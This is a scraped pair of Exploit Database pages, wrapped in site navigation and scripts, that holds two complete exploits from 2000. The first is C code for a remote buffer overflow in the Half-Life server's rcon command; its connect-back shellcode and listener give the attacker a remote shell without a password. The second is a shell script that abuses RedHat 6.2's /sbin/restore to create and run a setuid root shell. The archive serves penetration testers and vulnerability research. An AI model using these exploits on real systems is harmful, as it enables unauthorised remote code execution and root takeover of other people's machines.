Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 181
Half Life - 'rcon' Remote Buffer Overflow - Linux remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDHalf Life - 'rcon' Remote Buffer OverflowEDB-ID:181CVE:EDB Verified:Author:Sao PauloType:remoteExploit:/Platform:LinuxDate:2000-11-16Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/**  SDI HalfLife rcon remote exploit for linux x86*  (portuguese) exploit remoto para o buffer overflow do rcon no halflife**  Tamandua Sekure Labs (Sao Paulo - Porto Alegre, Brazil)*  by Thiago Zaninotti (c0nd0r) <condor@sekure.org>*     Gustavo Scotti   (csh)    <csh@sekure.org>**  Proof of concept - There is a remote exploitable buffer overflow*  in Half Life server (3.1.0.x) for linux (HLDS). The problem is*  related to the RCON command (Remote CONsole).*  (port.) Existe um buffer overflow exploitavel no Half Life Server*  (HLDS) relacionado ao comando RCON.**  After several tests, we found out the 'rcon' command is also vulnerable*  to a format string attack which can also lead to a remote exploit.*  (port) O comando RCON tambem e' vulneravel a um format string attack.**  YOU DO NOT NEED THE RCON PASSWORD TO EXPLOIT THIS VULNERABILITY,*  which means any multiplayer server is vulnerable to the attack.*  (port) Voce nao precisa de password para explorar esta vulnerabilidade,*    o que significa que qualquer servidor e' vulneravel.**  Agradecimentos: Tamandua Sekure Labs, Fabio Ramos (framos@axur.org),*  Eduardo Freitas, Marcos Sposito, Roberto Monteiro (casper),*  Nelson Britto (stderr), Sabrina Monteiro, Gabriel Zaninotti e*  Felipe Salum. A todos os leitores da Best of Security Brasil (BOS-BR).**  Respects: c_orb, el8.org (specially duke), meta, guys at core sdi,*  the "infame" TOXYN.ORG (pt rocks) - r00t, pr0m, horizon, plaguez,*  ratao and p.ulh.as/promisc.net crew. Greetz to AXUR.ORG too! guys at*  sekure.org: vader, jamez, falcon and staff.**  also thanks to botman (botman@mailandnews.com).*  Visit the brazilian security portal: http://www.securenet.com.br*/#include <stdlib.h>#include <stdio.h>#include <netinet/in.h>#include <sys/socket.h>#include <sys/time.h>#include <netdb.h>typedef unsigned long	u32;typedef unsigned short	u16;typedef unsigned char	u8;unsigned char shellcode[]="\xeb\x03\x5e\xeb\x1d\xe8\xf8\xff\xff\xff scotti@axur.org""\x2f\x62\x69\x6e\x2f""\x73\x68\x40\x31\xc0\x66\x40\x66\x40\x66\x89\x06\x31\xc9\xb1\x08""\x89\xf7\x83\xc7\x08\x30\xc0\x88\x07\x47\x49\x75\xfa\x31\xc0\x89""\x46\x28\x40\x89\x46\x24\x40\x89\x46\x20\x8d\x4e\x20\x31\xdb\x43""\x31\xc0\x83\xc0\x66\xcd\x80\x89\xc7\x89\x46\x20\x8d\x06\x89\x46""\x24\x31\xc0\x83\xc0\x10\x89\x46\x28\x8d\x4e\x20\x31\xdb\x43\x43""\x43\x31\xc0\x83\xc0\x66\x57\xcd\x80\x5f\x31\xc0\x83\xc0\x3f\x89""\xfb\x31\xc9\xcd\x80\x31\xc0\x83\xc0\x3f\x31\xdb\x31\xc9\x41\xcd""\x80\x31\xc0\x83\xc0\x3f\x31\xdb\x31\xc9\x41\x41\xcd\x80\x89\xf0""\x83\xc0\x18\x89\x46\x18\x31\xc0\x88\x46\x17\x89\x46\x1c\xb0\x0b""\x8d\x4e\x18\x8d\x56\x1c\x89\xf3\x83\xc3\x10\xcd\x80\x31\xc0\x40""\xcd\x80";/* NET functions */intudp_read( int sock, u32 *daddr, u16 *port, void *ptr, u16 ptr_size){struct sockaddr_in server;int i,n;i = sizeof(server);n=recvfrom( sock, ptr, ptr_size, 0, (struct sockaddr *)&server, &i);*daddr = ntohl(server.sin_addr.s_addr);*port = ntohs(server.sin_port);return n;}intudp_send( int sock, u32 daddr, u16 port, void *ptr, u16 ptr_size){struct sockaddr_in server;server.sin_family = AF_INET;server.sin_port = htons( port);server.sin_addr.s_addr = htonl( daddr);return sendto( sock, ptr, ptr_size, 0, (struct sockaddr *)&server, sizeof(server));}intudp_connect( u32 addr, u16 port){struct sockaddr_in client;int new_fd;new_fd = socket( AF_INET, SOCK_DGRAM, 0);if (new_fd<0)return new_fd;bzero( (char *) &client, sizeof( client));client.sin_family = AF_INET;client.sin_addr.s_addr = htonl( addr);client.sin_port = htons( port);if (connect( new_fd, (struct sockaddr *)&client, sizeof(client))<0)return -1; /* cant bind local address */return new_fd;}u32 dns2ip( u8 *host){struct hostent *dns;u32     saddr;dns = gethostbyname( host);if (!dns)return 0xffffffff;bcopy( (char *)dns->h_addr, (char *)&saddr, dns->h_length);return ntohl(saddr);}intasync_read( int sock_r, int rettime){fd_set           fd_r;struct timeval   tv;char             try_ch[4]="/-\\|";int r,j;for (r=0;r<rettime;r++){for (j=0;j<20;){int i;printf("\b%c", try_ch[(j%4)]);fflush(stdout);FD_ZERO( &fd_r);FD_SET( sock_r, &fd_r);tv.tv_sec  = 0;tv.tv_usec = 50000;i =select( sock_r + 1, &fd_r, NULL, NULL, &tv);if (!i) { j++; continue; }if (i>0)if (FD_ISSET(sock_r, &fd_r)) return sock_r;elsereturn -1;}}return -1;}intget_server_info( int sock, u32 addr, u16 port){u32 r_addr;u16 r_port;int n, i;u8  pkt[256], *str;pkt[0] = pkt[1] = pkt[2] = pkt[3] = 0xff;sprintf(&pkt[4], "details");n = udp_send(sock, addr, port, pkt, strlen(pkt));printf(".  connecting to the server...  "); fflush(stdout);if (async_read(sock, 6)<0)goto server_down;n = udp_read(sock, &addr, &port, pkt, sizeof(pkt));if (n<0){server_down:printf("\bserver down!\r*\n");exit(0);}printf("\bdone\n");str = &pkt[4];str+=strlen(str)+1;printf("\t server_name  [%s]\n", str); str+=strlen(str)+1;printf("\t    map_name  [%s]\n", str); str+=strlen(str)+1;str+=strlen(str)+1;printf("\t   game_name  [%s]\n", str); str+=strlen(str)+1;printf("\tusers_online  [%d of %d]\n", str[0], str[1]); str+=3;printf("\t   remote_OS  [%s]\n", (str[1]=='w' ? "windows" : (str[1]=='l' ? "linux" : "unknown")));if (str[1]=='w') return 2;if (str[1]=='l') return 1;return 0;}u32 retrieve_local_info(int sock, u8 *host){struct sockaddr_in server;int    soclen;soclen = sizeof(server);if (getsockname(sock, (struct sockaddr *)&server, &soclen)<0){printf("error in getsockname\n");exit(0);}snprintf(host, 256, "%s:%d", inet_ntoa(server.sin_addr), htons(server.sin_port));return htonl(server.sin_addr.s_addr);}intbind_tcp( int *port){struct sockaddr_in mask_addr;int sock, portno=25000; /* base_port */sock = socket( AF_INET, SOCK_STREAM, 0);if (sock<0)return sock;redo:mask_addr.sin_family = AF_INET;mask_addr.sin_port = htons( portno);mask_addr.sin_addr.s_addr = 0;if (bind(sock, (struct sockaddr *)&mask_addr, sizeof(mask_addr))<0){error:portno++;if (portno>26000){printf("*  no TCP port to bind in.\n");exit(0);}goto redo;}if (listen( sock, 0)<0)goto error;printf(".  TCP listen port number %d\n", portno);*port = portno;return sock;}wait_for_connect(int sock){fd_set fds;u8     tmp[256];int    tcp, addr_len;struct sockaddr_in server;printf(".  waiting for connect_back shellcode responde...  ");if (async_read(sock, 15)!=sock){printf("\bfailed!\r*\n");exit(0);}tcp = accept( sock, (struct sockaddr *)&server, &addr_len);printf("\bconnected\n.       ^---> from %s:%d\n", inet_ntoa(server.sin_addr), ntohs(server.sin_port));close(sock); /* closing incoming socket */printf(".  congratulations. you have owned this one.\n");/* basic async mode */while (1){FD_ZERO(&fds);FD_SET(0, &fds);FD_SET(tcp, &fds);if (select(tcp+1, &fds, NULL, NULL, NULL)>0){if (FD_ISSET(0, &fds)){int n;n = read(0, tmp, 256);if (n<0)goto end_conn;if (write(tcp, tmp, n)!=n) goto end_conn;}if (FD_ISSET(tcp, &fds)){int n;n = read(tcp, tmp, 256);if (n<0)goto end_conn;if (write(0, tmp, n)!=n) goto end_conn;}}}end_conn:close(tcp);printf(".  bye-bye. Stay tuned for more Tamandua Sekure Labs codes.\n");}assembly_shell_code(int sock, u32 addr, u16 port, u32 laddr, u8 *linfo){u8    pkt[2048],*shell_ptr;struct sockaddr_in *sc_server;u32   ret_addr = 0xbfffb1f4, last_byte = 1014, over_head = 40;int   i, n, tcp, tcp_port;printf(".  localinfo %s\n", linfo);tcp = bind_tcp( &tcp_port);sc_server = (struct sockaddr_in *)&shellcode[10];sc_server->sin_addr.s_addr = htonl(laddr);sc_server->sin_port = htons(tcp_port);last_byte-=strlen(linfo);pkt[0] = pkt[1] = pkt[2] = pkt[3] = 0xff;sprintf( &pkt[4], "rcon ");i = strlen(pkt);shell_ptr = &pkt[i];/* find out how many nops we can push before shellcode */n = last_byte - i - sizeof(shellcode)-1 - over_head;for (i=0;i<n;i++)shell_ptr[i] = 0x90; /* nop */shell_ptr+=i;/* fill in the shellcode */for (i=0;i<sizeof(shellcode)-1;i++)shell_ptr[i] = shellcode[i];shell_ptr+=i;/* fill in the overhead buffer */for (i=0;i<over_head;i++)shell_ptr[i] = '-';shell_ptr+=i;/* fill return address and ebp */*(u32 *)shell_ptr = ret_addr; shell_ptr+=4;*(u32 *)shell_ptr = ret_addr; shell_ptr+=4;/* finalize string */*shell_ptr = 0;n = udp_send( sock, addr, port, pkt, strlen(pkt));printf(".  sending poison code. %d bytes sent\n",n);wait_for_connect(tcp);}usage(){printf("\n.  usage: hl-rcon <server ip[:port]>\n");exit(-1);}main(int argc, char **argv){u32 addr, laddr;u16 port;int sock, i;u8  linfo[256], *tmp = NULL;printf(".  half-life 3.1.0.x remote buffer-overflow for linux x86\n");printf(".  (c)2000, Tamandua Sekure Laboratories\n");printf(".  Authors: Thiago Zaninotti & Gustavo Scotti\n");if (argc<2)usage();tmp = (u8 *)strchr(argv[1], ':');if (tmp){*tmp = 0; tmp++;port = atoi(tmp);}else{printf(":  port not found, using default 27015\n");port = 27015;}addr = dns2ip(argv[1]);if (addr==0xffffffff){printf("host not found!\n");exit(0);}sock = udp_connect( addr, port);laddr = retrieve_local_info(sock, linfo);if (get_server_info(sock, addr, port)!=1){printf("this is not a linux server. Make a shellcode to it and have fun\n");exit(0);}assembly_shell_code(sock, addr, port, laddr, linfo);}// milw0rm.com [2000-11-16]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPort142122232542495366697079808110210511011111311912313513914316116216438338940240641144344444544650250451351451553254855455561762363165568978378780887388890199810001040108910991100111411201194123514711521153315811589160416171723174317611812185818611900194720002022204921002103212121252181224223152375238023812401248025252640281028122947295429903000303030503052312831293181320032173306333333783389346034653500353536323690379038143817400040024070408141054111432243434434450145554592466147504848500050605061508050815093515151805247525052725308543254665554555556005655566658005803581458585900598460666070608060826101611261296379650265036660666770017002707070717080710071447210727272907426744375107547764977707777777877877879790280008001800280048008802080228023802880308080808180828088809081818300840084438445847385008585861988008812883988808888900090019002908090909091910091249200925192569443944797849788985598769900998799939999100001000110080102021020310443106161100011211114601220312221123451239712401133271370113722138381699218821188811900019810198132000020010200312011120171220032342325672260002701527700280153000030303313373240032674327643420537215377773784838292400074152344334468244808049152500005049652311527895286952986534135434554890555545555556380577725808062514TagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 182
RedHat 6.2 - '/sbin/restore' Local Privilege Escalation - Linux local Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDRedHat 6.2 - '/sbin/restore' Local Privilege EscalationEDB-ID:182CVE:2000-1125EDB Verified:Author:anonymousType:localExploit:/Platform:LinuxDate:2000-11-16Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED#!/bin/sh## /sbin/restore exploit for rh6.2## I did not find this weakness my self, all i did was# writing this script (and some more) to make it# automatic and easy to use.## This exploit should work on all redhat 6.2 systems# with /sbin/restore not "fucked up". May work on other# distros too, but only tested successfully on rh6.2.## Make sure that the $USER variable is set! If you aren't# sure, do a SET USER=<your-login-name> before you start# the exploit!## Please do NOT remove this header from the file.#echo "###########################################"echo "#     /sbin/restore exploit for rh6.2     #"echo "#          this file by nawok '00         #"echo "###########################################"echo " "echo "==> EXPLOIT STARTED, Wait..."echo "#!/bin/sh" >> /home/$USER/execfileecho "cp /bin/sh /home/$USER/sh" >> /home/$USER/execfileecho "chmod 4755 /home/$USER/sh" >> /home/$USER/execfilechmod 755 /home/$USER/execfileexport TAPE=restorer:restorerexport RSH=/home/$USER/execfiletouch /tmp/1/sbin/restore -t /tmp/1rm -f /home/$USER/execfileecho "==> DONE! If everything went OK we will now enter rootshell..."echo "==> To check if its rooted, type 'whoami', or 'id'"echo "==> B-Bye, you are on your own now."/home/$USER/sh# milw0rm.com [2000-11-16]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept 